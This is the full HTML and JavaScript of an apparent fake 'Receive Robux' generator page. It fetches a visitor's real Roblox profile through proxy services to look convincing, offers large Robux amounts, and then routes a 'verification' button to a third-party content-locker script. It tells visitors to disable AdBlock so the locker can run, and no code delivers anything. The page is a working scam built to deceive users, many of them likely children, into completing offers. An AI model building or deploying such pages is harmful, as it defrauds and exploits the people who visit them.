<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>hub rbx</title>
  <link rel="icon" href="https://i.postimg.cc/mrqnh6Rx/68482d03036061749560579.png" type="image/png">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&display=swap");
    *{margin:0;padding:0;box-sizing:border-box;font-family:"Kumbh Sans",sans-serif}
    body{background:#f2f4f5;color:#393b3d}
    .logo{width:30px;display:flex;align-items:center}
    .logo span{font-weight:900;margin-right:18px;font-size:25px}
    nav{width:100%;display:flex;align-items:center;justify-content:space-between;background:#dee1e3;border-bottom:1px solid #c7cbce;padding:0 40px}
    nav ul{list-style:none;display:flex}
    ul li{margin-left:30px}
    @media (max-width:373px){.logo span{display:none}nav{padding:0}}
    @media (max-width:442px){nav{padding:0 20px}}
    @media (max-width:396px){nav{padding:0 10px}}
    .animate-fade-in{animation:fadeIn .5s ease-in-out}
    @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
    .resource-option{transition:all .2s ease}
    .resource-option:hover{transform:scale(1.04); background-color:#eff6ff}
    .resource-option.selected{
      background: linear-gradient(135deg,#10b981 0%, #06b6d4 100%);
      color:#fff; border-color: transparent !important;
      transform: scale(1.06);
      box-shadow: 0 12px 24px rgba(16,185,129,.25);
    }
    .resource-option.selected p{ color:#fff !important; }
    @keyframes gradientShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
    #debug{display:none} body.show-debug #debug{display:block}
  </style>

  
  
  <script>
    document.addEventListener('DOMContentLoaded',function(){
      if (/(?:\?|&)debug=1(?:&|$)/i.test(location.search)) {
        document.body.classList.add('show-debug');
      }
    });
  </script>

</head>
  
<body>
  <!-- NAV -->
  <nav>
    <div class="logo">
      <span>&#9776;</span>
      <img alt="Logo" src="https://i.postimg.cc/fW0knPZW/image.png"/>
    </div>
    <ul><li>Charts</li><li>Marketplace</li><li>Rbux</li></ul>
  </nav>

  <!-- HERO -->
  <div class="w-screen h-52 md:h-64 relative overflow-hidden shadow-lg mb-10">
    <img alt="Banner" class="absolute inset-0 w-full h-full object-cover" src="https://i.postimg.cc/Hs876gby/tmpsglzyjxi.png"/>
    <div class="absolute inset-0 bg-black/40 flex items-center justify-center">
      <h1 class="text-3xl md:text-5xl font-bold text-white text-center px-4">Receive Robux</h1>
    </div>
  </div>
<!-- MAIN -->
  <div class="max-w-xl mx-auto py-10 px-6 text-center">
    <!-- Search -->
    <div class="animate-fade-in space-y-3">
      <input id="username" type="text" placeholder="Enter your Roblox username"
             class="w-full max-w-md mx-auto h-10 px-3 rounded-lg shadow border border-gray-300 text-base focus:outline-none focus:ring-2 focus:ring-green-500"/>
      <!-- FIX: type="button" + inline onclick -->
      <button id="search-button" type="button" aria-label="Search username"
              onclick="return fetchProfilePublic()"
              class="group inline-flex items-center justify-center gap-2 text-white px-6 h-10 rounded-xl transition-transform duration-300 hover:-translate-y-0.5 active:translate-y-0 focus:outline-none focus:ring-2 focus:ring-green-400"
              style="background-image:linear-gradient(90deg,#16a34a,#22c55e,#16a34a);background-size:200% 100%;animation:gradientShift 4s ease-in-out infinite;box-shadow:0 10px 20px rgba(34,197,94,.25)">
        <span class="font-medium">Search</span>
        <svg class="w-4 h-4 transition-transform duration-300 group-hover:translate-x-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <circle cx="11" cy="11" r="8"></circle>
          <path d="m21 21-3.5-3.5"></path>
        </svg>
      </button>
    </div>
<!-- Profile -->
    <div id="profile" class="hidden mt-6 text-center animate-fade-in">
      <img id="avatar" class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" alt="Avatar"/>
      <p id="display-name" class="text-xl font-semibold"></p>
      <p id="username-line" class="text-sm text-gray-500"></p>
    </div>

    <!-- Rbux amount -->
    <div id="resource-section" class="hidden mt-8">
      <p class="block text-lg font-medium mb-4">Select rbux amount</p>
      <div class="grid grid-cols-2 gap-4">
        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300" onclick="selectResource(this,800)">
          <img alt="800 Rbux" class="w-8 h-8 mx-auto mb-2" src="https://i.postimg.cc/28KHb3M7/20250921-192639.png"/><p class="text-xl font-semibold">800</p>
        </div>
        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300" onclick="selectResource(this,1700)">
          <img alt="1700 Rbux" class="w-8 h-8 mx-auto mb-2" src="https://i.postimg.cc/28KHb3M7/20250921-192639.png"/><p class="text-xl font-semibold">1700</p>
        </div>
        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300" onclick="selectResource(this,4500)">
          <img alt="4500 Rbux" class="w-8 h-8 mx-auto mb-2" src="https://i.postimg.cc/28KHb3M7/20250921-192639.png"/><p class="text-xl font-semibold">4500</p>
        </div>
        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300" onclick="selectResource(this,10000)">
          <img alt="10000 Rbux" class="w-8 h-8 mx-auto mb-2" src="https://i.postimg.cc/28KHb3M7/20250921-192639.png"/><p class="text-xl font-semibold">10000</p>
        </div>
      </div>
      <div class="flex justify-center mt-6">
        <button id="confirm-button" onclick="openVerify()"
                class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition">Confirm</button>
      </div>
    </div>
  </div>
<!-- Loading -->
  <div id="loading-overlay" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center z-50">
    <div class="text-center">
      <div class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"></div>
      <p class="text-white text-xl font-semibold animate-pulse">Loading...</p>
    </div>
  </div>

  <!-- Verify -->
  <div id="verify-step" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50">
    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
      <p class="text-lg font-medium mb-3">Complete the verification to receive your rbux.</p>
      <button id="verify-btn" onclick="return __inlineLockerTrigger(event)"
              class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition">Verify</button>
      <p id="locker-fallback" class="text-xs text-red-600 mt-3 hidden">Verification couldn’t start. Please disable AdBlock / allow third-party scripts, then refresh.</p>
    </div>
  </div>

  <!-- Debug -->
  <div id="debug">
    <div><b>Locker loaded:</b> <span id="dbg-loaded">no</span></div>
    <div><b>Trigger found:</b> <span id="dbg-trigger">none</span></div>
  </div>

<script>
  (function(){
    const CLUSTERS = [
      { users:"https://users.roproxy.com", thumbs:"https://thumbnails.roproxy.com" },
      { users:"https://users.rprxy.xyz",   thumbs:"https://thumbnails.rprxy.xyz"   }
    ];
    const MAP_ENDPOINTS = [
      "https://users.roproxy.com/v1/usernames/users",
      "https://users.rprxy.xyz/v1/usernames/users"
    ];
    const SEARCH_LIMIT = 25;
    const TIMEOUT_MS   = 6000;

    const loading      = document.getElementById("loading-overlay");
    const profile      = document.getElementById("profile");
    const avatarEl     = document.getElementById("avatar");
    const dnameEl      = document.getElementById("display-name");
    const unameLineEl  = document.getElementById("username-line");
    const resourceSec  = document.getElementById("resource-section");
    const confirmBtn   = document.getElementById("confirm-button");
    const usernameInput= document.getElementById("username");
    const searchBtn    = document.getElementById("search-button");
    const dbgLoaded    = document.getElementById("dbg-loaded");
    const dbgTrig      = document.getElementById("dbg-trigger");

const CACHE = new Map();
    const validUsername = u => /^[A-Za-z0-9_]{3,20}$/.test(u);
    const any = (arr)=> Promise.any ? Promise.any(arr) : new Promise((res,rej)=>{
      let left=arr.length, errs=[];
arr.forEach(p=>Promise.resolve(p).then(res).catch(e=>{errs.push(e); if(--left===0) rej(errs[0]||new Error("All failed"));}));
    });
    function withTimeout(p, ms){ return Promise.race([p, new Promise((_,rej)=>setTimeout(()=>rej(new Error("timeout")), ms))]); }
    async function requestJSON(url, opts={}){
      const res = await fetch(url, {cache:'no-store', mode:'cors', redirect:'follow', referrerPolicy:'no-referrer', ...opts});
      const txt = await res.text();
      if(!res.ok) throw new Error(`HTTP ${res.status}\n${txt.slice(0,200)}`);
      return txt ? JSON.parse(txt) : {};
    }
function findLockerTrigger(){
      const g=["_cy","_lc","_lo","_ly","open_locker","show_locker","run_locker","start_locker","verify_locker"];
      for(const n of g){ if(typeof window[n]==="function") return window[n]; }
      const obj = window.XoyVG_lvn_gsgMFc;
      if(obj){ for(const m of ["open","run","start","show","verify","go","begin","launch","fire","display"]){ if(typeof obj[m]==="function") return obj[m].bind(obj); } }
      return null;
    }
    function updateDebug(){
      const t = findLockerTrigger();
      if(dbgLoaded) dbgLoaded.textContent = t ? "yes" : "no";
      if(dbgTrig)   dbgTrig.textContent   = t ? (t.name || "function") : "none";
    }
    window.__inlineLockerTrigger = function(){
      const verifyStep = document.getElementById("verify-step");
      const fallback   = document.getElementById("locker-fallback");
      verifyStep.classList.remove("hidden");
      fallback.classList.add("hidden");
      try{ const t=findLockerTrigger(); updateDebug(); if(t){ t(); return false; } }catch{}
      setTimeout(()=>{ try{ const t=findLockerTrigger(); updateDebug(); if(t){ t(); } else { fallback.classList.remove("hidden"); } }catch{ fallback.classList.remove("hidden"); } },0);
      return false;
    };
async function fetchByMap(raw){
      const body = JSON.stringify({usernames:[raw], excludeBannedUsers:true});
      const headers = {"Content-Type":"application/json","Accept":"application/json"};
      const p = MAP_ENDPOINTS.map(ep =>
        requestJSON(ep,{method:"POST", headers, body})
        .then(d=>{
          const u=d?.data?.[0];
          if(!u) throw "no-user";
          return { id:u.id, username:u.requestedUsername || u.username || raw, displayName:u.displayName || null };
        })
      );
      return any(p);
    }
    async function fetchBySearch(raw){
      const q=encodeURIComponent(raw);
      const p = CLUSTERS.map(c =>
        requestJSON(`${c.users}/v1/users/search?keyword=${q}&limit=${SEARCH_LIMIT}`)
        .then(d=>{
          const list=d?.data||[];
          if(!list.length) throw "no-user";
          const lower=raw.toLowerCase();
          let m=list.find(u=>(u.name||u.username||"").toLowerCase()===lower); if(!m) m=list[0];
          return { id:m.id, username:m.name||m.username||raw, displayName:m.displayName||null };
        })
      );
      return any(p);
}
    async function getDisplay(u){
      const p = CLUSTERS.map(c => requestJSON(`${c.users}/v1/users/${u.id}`).then(d=>({...u, displayName:d?.displayName||u.username})));
      return any(p).catch(()=>u);
    }
    async function getAvatar(id){
      const p = CLUSTERS.map(c => requestJSON(`${c.thumbs}/v1/users/avatar?userIds=${id}&size=150x150&format=Png&isCircular=false`).then(d=>d?.data?.[0]?.imageUrl||""));
      return any(p).catch(()=> "");
    }
    async function fastLookup(raw){
      if(CACHE.has(raw)) return CACHE.get(raw);
      const user  = await any([fetchByMap(raw), fetchBySearch(raw)]).catch(()=>({id:0, username:raw, displayName:raw}));
      const disp  = await getDisplay(user).catch(()=>user);
      const avUrl = await getAvatar(disp.id);
      const result = {user:disp, avatar:avUrl};
      CACHE.set(raw, result);
      return result;
    }
async function fetchProfile(){
      const raw = usernameInput.value.trim();
      profile.classList.add("hidden");
      resourceSec.classList.add("hidden");
      confirmBtn.classList.add("hidden");
      document.querySelectorAll(".resource-option").forEach(x=>x.classList.remove("selected"));
      if(!raw || !validUsername(raw)) return;

      loading.classList.remove("hidden");
      try{
        const {user, avatar} = await withTimeout(fastLookup(raw), TIMEOUT_MS)
                                 .catch(()=>({user:{username:raw, displayName:raw}, avatar:""}));
        avatarEl.src = avatar || "https://i.imgur.com/l9Qdc3C.jpeg";
        dnameEl.textContent = user.displayName || user.username;
        unameLineEl.textContent = "@"+user.username;
        profile.classList.remove("hidden");
        resourceSec.classList.remove("hidden");
      }finally{
        loading.classList.add("hidden");
        updateDebug();
      }
    }
window.selectResource = function(el, val){
      document.querySelectorAll(".resource-option").forEach(x=>x.classList.remove("selected"));
      el.classList.add("selected");
      confirmBtn.classList.remove("hidden");
    };

    // نحافظو على event listener
    searchBtn.addEventListener("click", fetchProfile);
    usernameInput.addEventListener("keydown", (e)=>{ if(e.key==="Enter") fetchProfile(); });

    // ونخرجو دالة عمومية باش onclick يخدم حتى فـ Blogger
    window.fetchProfilePublic = function(){ fetchProfile(); return false; };

    document.getElementById("locker-script")?.addEventListener("load", updateDebug);
    document.getElementById("locker-script")?.addEventListener("error", ()=>{ if(dbgLoaded) dbgLoaded.textContent="error"; });
updateDebug();
  })();

  // يفتح المودال فقط، بدون تشغيل locker
  function openVerify(){
    var v = document.getElementById('verify-step');
    var f = document.getElementById('locker-fallback');
    if (f) f.classList.add('hidden');
    if (v) v.classList.remove('hidden');
    return false;
  }
  </script>
  
  <script type="text/javascript">
    var eulHM_hMK_jLUpcc={"it":4357240,"key":"b4a8c"};
</script>
  <script src="https://duw03nk63ml3f.cloudfront.net/4f438fc.js"></script>
  
  
</body>
</html>